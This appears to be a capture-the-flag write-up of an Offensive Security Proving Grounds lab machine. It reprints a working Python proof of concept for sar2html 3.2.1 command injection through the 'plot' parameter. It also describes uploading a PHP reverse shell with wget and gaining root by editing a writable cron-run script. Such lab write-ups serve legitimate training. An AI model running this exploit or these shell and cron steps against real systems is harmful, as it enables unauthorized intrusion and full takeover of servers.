This is my first Proving grounds machine.

![image](https://user-images.githubusercontent.com/64267672/160265693-312e5c8f-6723-490e-86ab-7716aca9610a.png)


Starting with an nmap scan and i find 2 ports open. Ports 80 & 22


![image](https://user-images.githubusercontent.com/64267672/160264929-f53ee91e-6600-47c9-8e54-a1b583f8a1a1.png)

Starting attack off with port 80


visiting the webpage, we have a default apache web page, nothing in comments

![image](https://user-images.githubusercontent.com/64267672/160264955-701a2896-b9a0-445b-b044-869a1928166b.png)


Looking at the robots.txt & we have somthing interesting.

![image](https://user-images.githubusercontent.com/64267672/160264995-872e09f1-6440-46b5-a230-3805bb9b6544.png)

now visiting the new endpoint 

![image](https://user-images.githubusercontent.com/64267672/160265058-985bdcbb-35bf-4618-9493-dcfa97f79640.png)

i did a little research & found a known exploit for this which we'll use to exploit;

![image](https://user-images.githubusercontent.com/64267672/160265109-b65d3154-f1d0-450e-afec-65dd455f6971.png)

now poc;

`````
# Exploit Title: sar2html 3.2.1 - 'plot' Remote Code Execution
# Date: 27-12-2020
# Exploit Author: Musyoka Ian
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Ubuntu 18.04.1

#!/usr/bin/env python3

import requests
import re
from cmd import Cmd

url = input("Enter The url => ")

class Terminal(Cmd):
    prompt = "Command => "
    def default(self, args):
        exploiter(args)

def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()
`````

![image](https://user-images.githubusercontent.com/64267672/160265249-b070294f-2f9a-4c6b-b28d-3e214a3ad7d3.png)

now we can get a reverse shell of course 😉

I got a copy of the pentest monkey php reverse shell to my local machine, then hosted a http python server & uploaded reverse shell with wget on victim machine;

![image](https://user-images.githubusercontent.com/64267672/160265364-52dad309-00af-4609-9130-7f6ebf0b8814.png)

now we can stablize the shell, get user.txt & enumerate to elevate privilege;

looking around, we find a crontab running that lets the root user to execute a finally.sh file which in turn executes a write.sh file.


Apparently we can't write to finally.sh file but can for write.sh 

So i uploaded a php reverse shell, edited the write.sh file to call my newly uploaded php reverse shell script which gives me a root shell after the crontabs runs.


![image](https://user-images.githubusercontent.com/64267672/160265646-a9b83df0-4f35-4f31-8370-9cb191e4be13.png)



![image](https://user-images.githubusercontent.com/64267672/160265509-7de6f127-50d2-4957-a92c-4964300cb0a5.png)


And we can read root files even root.txt 😉

![image](https://user-images.githubusercontent.com/64267672/160265522-c842b9c7-a618-4b28-a6ba-15c7213e1f0e.png)









####RESOURCES
https://www.exploit-db.com/exploits/47204

https://portal.offensive-security.com/proving-grounds/play









